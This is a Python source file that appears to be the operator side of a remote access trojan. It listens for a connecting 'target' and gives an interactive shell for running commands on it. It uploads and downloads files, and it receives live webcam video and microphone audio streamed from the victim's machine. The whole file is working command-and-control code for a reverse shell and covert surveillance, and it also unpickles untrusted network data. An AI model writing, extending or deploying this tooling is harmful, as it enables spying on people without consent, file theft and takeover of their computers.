import socket
import json
import os
import threading
import cv2
import pyaudio
import pickle
import struct
import time

# --- Global Flag to Stop Threads ---
stop_threads = False

# --- Stream Reception Functions ---
def video_reception_thread():
    global stop_threads
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    video_server.bind(('0.0.0.0', 9999))
    video_server.listen(1)
    print("[*] Video server waiting for connection on port 9999...")
    
    try:
        conn, addr = video_server.accept()
        print(f"[+] Video client connected from: {addr}")
        
        data = b""
        payload_size = struct.calcsize("L")

        while not stop_threads:
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet: raise ConnectionError("Client disconnected")
                data += packet
            
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += conn.recv(4096)
            
            frame_data = data[:msg_size]
            data = data[msg_size:]
            
            frame = pickle.loads(frame_data)
            cv2.imshow('Live Video Stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[!] 'q' pressed in video window. Type 'quit' in shell to exit.")
                # Don't stop threads here, let the main shell handle it
    except Exception as e:
        print(f"[!] Video stream ended: {e}")
    finally:
        print("[-] Video reception thread finished.")
        cv2.destroyAllWindows()
        video_server.close()

def audio_reception_thread():
    global stop_threads
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    audio_server.bind(('0.0.0.0', 9998))
    audio_server.listen(1)
    print("[*] Audio server waiting for connection on port 9998...")

    try:
        conn, addr = audio_server.accept()
        print(f"[+] Audio client connected from: {addr}")

        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        
        while not stop_threads:
            data = conn.recv(1024)
            if not data: break
            stream.write(data)
    except Exception as e:
        print(f"[!] Audio stream ended: {e}")
    finally:
        print("[-] Audio reception thread finished.")
        audio_server.close()

# --- Reliable Send/Receive & File Transfer ---
def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except (ValueError, json.JSONDecodeError):
            continue
        except (ConnectionResetError, ConnectionAbortedError):
            print("\n[!] Client has disconnected.")
            return None

def upload_file(target, file_name):
    try:
        with open(file_name, 'rb') as f:
            target.send(f.read())
        print("[+] File uploaded successfully.")
    except FileNotFoundError:
        print(f"[-] Error: File '{file_name}' not found on server machine.")

def download_file(target, file_name):
    print(f"[*] Downloading '{file_name}'...")
    with open(file_name, 'wb') as f:
        target.settimeout(2)
        try:
            chunk = target.recv(1024)
            if chunk == b'FILE_NOT_FOUND_ERROR':
                print("[-] Client reported that the file does not exist.")
                f.close()
                os.remove(file_name)
                return
            while chunk:
                f.write(chunk)
                chunk = target.recv(1024)
        except socket.timeout:
            pass
    target.settimeout(None)
    print(f"[+] Download complete. Saved as '{file_name}'.")

# --- Main Server Shell ---
def target_communication(target, ip):
    global stop_threads
    
    v_thread = threading.Thread(target=video_reception_thread, daemon=True)
    a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
    v_thread.start()
    a_thread.start()

    while not stop_threads:
        try:
            command = input(f'* Shell~{str(ip)}: ')
            if not command: continue

            reliable_send(target, command)

            if command == 'quit':
                stop_threads = True
                break
            
            # For file transfers, the functions handle their own communication.
            # For other commands, we expect a single response.
            if not command.startswith('upload') and not command.startswith('download'):
                result = reliable_recv(target)
                if result is None:
                    stop_threads = True
                    break
                print(result)
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Shutting down server.")
            reliable_send(target, 'quit')
            stop_threads = True
            break
        except Exception as e:
            print(f"[!] An error occurred in the main shell: {e}")
            stop_threads = True
            break
            
    print("[-] Main shell loop terminated.")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 5555))
    print('[+] Listening For The Incoming Connections on port 5555...')
    sock.listen(1)
    
    target, ip = sock.accept()
    print(f'[+] Target Connected From: {str(ip)}')
    
    target_communication(target, ip)
    
    print("[*] Shutting down all threads...")
    sock.close()

if __name__ == "__main__":
    main()
